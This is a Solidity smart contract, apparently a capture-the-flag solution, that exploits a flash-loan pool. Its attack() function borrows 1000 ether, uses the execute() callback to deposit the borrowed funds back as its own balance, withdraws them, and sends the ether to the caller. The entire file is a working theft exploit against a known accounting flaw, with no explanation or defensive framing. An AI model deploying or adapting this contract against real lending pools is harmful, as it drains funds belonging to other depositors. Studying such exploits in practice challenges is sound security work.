// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract FlashLoanEtherReciever {
    address public pool;

    function setPool(address _pool) external {
        pool = _pool;
    }

    fallback() external payable {}

    function attack() public {
        pool.call(
            abi.encodeWithSignature("flashLoan(uint256)", 1000 * (10**18))
        );
        pool.call(abi.encodeWithSignature("withdraw()"));
        payable(msg.sender).transfer(1000 * (10**18));
    }

    function execute() external payable {
        pool.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
    }
}
